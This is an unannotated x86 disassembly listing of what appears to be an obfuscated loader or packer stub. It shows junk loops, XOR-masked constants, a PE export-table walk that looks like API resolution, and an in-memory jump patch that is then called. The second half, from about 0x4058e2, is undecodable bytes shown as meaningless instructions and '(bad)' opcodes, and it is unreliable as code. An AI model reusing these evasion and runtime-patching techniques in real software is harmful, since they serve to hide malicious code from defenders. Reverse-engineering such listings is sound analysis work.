  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR [edi+esi*8-0x63],ebx
  4058f1:	mov    ?,WORD PTR [edi+ebx*2]
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	push   ds
  4058fb:	in     eax,0xf9
  4058fd:	in     al,dx
  4058fe:	or     BYTE PTR [eax+0x6d],bl
  405901:	xor    DWORD PTR ds:0x3267caca,esi
  405907:	adc    bl,bh
  405909:	push   eax
  40590a:	xchg   esi,eax
  40590b:	sub    eax,0x9c9d096e
  405910:	enter  0xe84a,0xff
  405914:	push   ds
  405915:	dec    eax
  405916:	fs ins BYTE PTR es:[edi],dx
  405918:	shl    BYTE PTR [edx],0xbe
  40591b:	outs   dx,BYTE PTR ds:[esi]
  40591c:	mov    esp,0xb5ac19cb
  405921:	mov    ebx,0x4eecf048
  405926:	cwde   
  405927:	and    ebx,edi
  405929:	(bad)  
  40592a:	cmp    esp,DWORD PTR [ebp+esi*8-0x7d]
  40592e:	jg     0x405990
  405930:	jae    0x4058f6
  405932:	mov    ecx,0x437c6dda
  405937:	and    eax,0xe5b6e565
  40593c:	jl     0x40591a
  40593e:	push   eax
  40593f:	inc    ebx
  405940:	cld    
  405941:	xor    al,0x2b
  405943:	(bad)  
  405944:	xor    DWORD PTR [ecx-0x48f5efb8],esp
  40594a:	push   ebx
  40594b:	dec    edx
  40594c:	jb     0x4058f5
  40594e:	lds    esi,FWORD PTR [ebx+0x7e]
  405951:	mov    BYTE PTR [ebp-0x5c],ah
  405954:	jl     0x4059c2
  405956:	ins    BYTE PTR es:[edi],dx
  405957:	inc    ecx
  405958:	and    DWORD PTR [edi],esi
  40595a:	je     0x405904
  40595c:	pop    esp
  40595d:	loop   0x4059b1
  40595f:	(bad)  
  405960:	pushf  
  405961:	call   0xdea3e495
  405966:	or     eax,0x7d4691d1
  40596b:	sbb    BYTE PTR [edi-0x3857fdcd],al
  405971:	aaa    
  405972:	in     eax,dx
  405973:	xor    ebx,DWORD PTR [ebp+0x79]
  405976:	xchg   esp,eax
  405977:	mov    bl,bl
  405979:	jmp    0xb9b7:0x1d716ffb
  405980:	imul   BYTE PTR cs:[ebx+0xe859653]
  405987:	jecxz  0x405937
  405989:	call   0xc4a6:0xecd3cf62
  405990:	mov    dl,0x74
  405992:	test   BYTE PTR [ecx],0x86
  405995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405996:	sar    ebx,1
  405998:	jnp    0x4059de
  40599a:	jmp    0x982e9fa9
  40599f:	bound  ecx,QWORD PTR [ecx]
  4059a1:	mov    ds:0xe7d7a5ac,al
  4059a6:	fwait
  4059a7:	push   0x19
  4059a9:	sbb    dl,ch
  4059ab:	sub    al,BYTE PTR [ecx+0x276c43e9]
  4059b1:	inc    esi
  4059b2:	xor    edx,DWORD PTR [edx-0x33]
  4059b5:	loope  0x4059fa
  4059b7:	loope  0x405947
  4059b9:	(bad)  
  4059ba:	inc    ebp
  4059bb:	in     al,dx
  4059bc:	pushf  
  4059bd:	mov    ds,WORD PTR [edi-0x66]
  4059c0:	jg     0x405a1e
  4059c2:	fadd   st(0),st
  4059c4:	inc    ecx
  4059c5:	sub    bh,BYTE PTR [esp+edx*1+0x11c40262]
  4059cc:	xchg   esp,eax
  4059cd:	jp     0x4059bf
  4059cf:	adc    BYTE PTR [edx-0x27114841],0x85
  4059d6:	out    dx,al
  4059d7:	mov    dl,0xe
  4059d9:	mov    dh,0x22
  4059db:	push   cx
  4059dd:	stos   DWORD PTR es:[edi],eax
  4059de:	ins    DWORD PTR es:[edi],dx
  4059df:	jle    0x40598c
  4059e1:	adc    BYTE PTR [edi-0x4e],cl
  4059e4:	jge    0x4059ab
  4059e6:	(bad)  
  4059e7:	hlt    
  4059e8:	xor    DWORD PTR ds:0xc6017657,esp
  4059ee:	in     eax,0x54
  4059f0:	sbb    eax,0xeff61257
  4059f5:	ret    0x8b7b
  4059f8:	call   FWORD PTR [edx+0x29]
  4059fb:	sub    ecx,DWORD PTR [ebp+0x4a7d97b2]
  405a01:	dec    edx
  405a02:	dec    esi
  405a03:	xor    cl,BYTE PTR [edx]
  405a05:	pop    ds
  405a06:	(bad)  
  405a07:	sti    
  405a08:	ret    0x150c
  405a0b:	push   ecx
  405a0c:	add    bh,ch
  405a0e:	jns    0x4059e1
  405a10:	scas   al,BYTE PTR es:[edi]
  405a11:	xchg   DWORD PTR [edi+0x71],edx
  405a14:	adc    ecx,edx
  405a16:	cmc    
  405a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a18:	lods   eax,DWORD PTR ds:[esi]
  405a19:	fsub   DWORD PTR [ebx]
  405a1b:	nop
  405a1c:	scas   eax,DWORD PTR es:[edi]
  405a1d:	jns    0x405a24
  405a1f:	adc    DWORD PTR [edi],0xfef2d14c
  405a25:	aaa    
  405a26:	cli    
  405a27:	fist   DWORD PTR [ecx+edi*4]
  405a2a:	repz xor DWORD PTR [edi],ebp
  405a2d:	lock lds ebp,FWORD PTR [eax-0x6253b4d4]
  405a34:	fnstcw WORD PTR [esi+0x19f157f1]
  405a3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3b:	and    BYTE PTR [ecx],cl
  405a3d:	push   ds
  405a3e:	enter  0x28a6,0x48
  405a42:	test   edi,ebx
  405a44:	inc    ebp
  405a45:	mov    dh,0xb7
  405a47:	in     al,dx
  405a48:	repz dec edi
  405a4a:	sbb    esi,DWORD PTR ds:0x9c9d4a7f
  405a50:	pop    ss
  405a51:	rcr    ecx,cl
  405a53:	jle    0x405a28
  405a55:	(bad)  
  405a56:	(bad)  
  405a57:	repnz sbb BYTE PTR [ebx+0x7c0c4b48],bh
  405a5e:	test   al,0xf6
  405a60:	mov    WORD PTR [eax-0x2],?
  405a63:	mov    ch,0x16
  405a65:	sti    
  405a66:	sub    cl,cl
  405a68:	fs xchg esi,eax
  405a6a:	ins    DWORD PTR es:[edi],dx
  405a6b:	xchg   ebx,eax
  405a6c:	push   es
  405a6d:	xor    BYTE PTR [ebp-0x8],ch
  405a70:	repz adc al,0xa
  405a73:	or     edx,ebx
  405a75:	aas    
  405a76:	mov    ebx,0xf9b81421
  405a7b:	mov    esp,0x21b20112
  405a80:	imul   bl
  405a82:	adc    DWORD PTR [ecx],0xffffff8e
  405a85:	mov    al,ds:0x3ff9ff5a
  405a8a:	loope  0x405a6e
  405a8c:	cmc    
  405a8d:	test   DWORD PTR [ecx+0x19],edx
  405a90:	ds sahf 
  405a92:	pop    ebx
  405a93:	or     esi,DWORD PTR [edi]
  405a95:	icebp  
  405a96:	sub    eax,0xe2a1dd59
  405a9b:	into   
  405a9c:	test   al,0x2b
  405a9f:	dec    edi
  405aa0:	xor    al,0x5f
  405aa2:	std    
  405aa3:	xor    edi,ebx
  405aa5:	mov    cl,0xf6
  405aa7:	inc    esp
  405aa8:	mov    edi,0x3b58c327
  405aad:	int3   
  405aae:	cmp    DWORD PTR [ecx+0x21c1e166],esi
  405ab4:	pop    ds
  405ab5:	push   ecx
  405ab6:	jo     0x405afe
  405ab8:	inc    al
  405aba:	lods   eax,DWORD PTR es:[esi]
  405abc:	mov    ds:0xa1d14ea8,eax
  405ac1:	lea    edx,[ebx+edi*2+0x7321ae01]
  405ac8:	pop    ebp
  405ac9:	push   0xffffffe4
  405acb:	ja     0x405ad0
  405acd:	pop    edx
  405ace:	hlt    
  405acf:	pop    ss
  405ad0:	(bad)  
  405ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ad3:	and    DWORD PTR [ebx],eax
  405ad5:	ja     0x405a69
  405ad7:	repz fist WORD PTR [eax]
  405ada:	mov    cl,0x26
  405adc:	sbb    eax,0xc25ef444
  405ae1:	dec    ebx
  405ae2:	adc    eax,0xf5ac573a
  405ae7:	gs fmul st(2),st
  405aea:	enter  0x184d,0x8f
  405aee:	push   es
  405aef:	jl     0x405abb
  405af1:	xor    dh,ah
  405af3:	enter  0xcda9,0x40
  405af7:	pop    eax
  405af8:	and    eax,0xdf0ac266
  405afd:	mov    ds:0xde8b421b,al
  405b02:	inc    edi
  405b03:	imul   ecx,DWORD PTR [edx+esi*1+0x15b909c2],0x2e22923b
  405b0e:	retf   
  405b0f:	lds    esi,FWORD PTR [esi-0x34]
  405b12:	push   ebx
  405b13:	mov    ?,ebx
  405b15:	dec    DWORD PTR [ecx-0x3e]
  405b18:	mov    esi,0xb00abf8
